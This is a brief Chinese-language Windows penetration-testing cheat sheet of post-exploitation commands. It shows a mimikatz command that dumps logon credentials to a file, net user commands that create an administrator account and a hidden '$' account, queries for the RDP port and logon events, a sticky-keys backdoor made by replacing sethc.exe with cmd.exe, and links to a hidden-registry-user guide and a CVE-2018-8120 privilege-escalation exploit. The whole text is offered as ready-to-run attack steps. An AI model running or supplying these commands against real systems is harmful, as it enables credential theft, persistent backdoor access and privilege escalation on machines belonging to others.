# Windows渗透备忘录

### mimikatz

```
mimikatz.exe ""privilege::debug"" ""sekurlsa::logonpasswords full"" exit >> log.txt


```

###  添加用户

```
net user cmc Nqpqsnm123 /add

net localgroup administrators cmc /add

net user cmc$ Nqpqsnm123 /add
```

### 查看rdp端口

```
tasklist /svc |  findstr "TermService"

netstat -ano

REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server\WinStations\RDP-Tcp /v PortNumber
```

```
 3389记录获取：wevtutil.exe qe security "/q:*[System [(EventID=4624)]]"/f:text /rd:true /c:100 > c:\sys.txt     100是条数
```

### Shift后门

替换system32下的sethc.exe为cmd.exe

关闭远程桌面的

![image-20191107102719394.png](https://i.loli.net/2019/11/07/UY6mtA1eZOWRHxf.png)

使用Kali rdesktop 

## 创建注册表隐藏用户

 [https://blog.csdn.net/abcd51685168/article/details/41854981]( https://blog.csdn.net/abcd51685168/article/details/41854981 ) 

### 提权工具

#### 2018-8120

 [https://github.com/unamer/CVE-2018-8120]( https://github.com/unamer/CVE-2018-8120 ) 

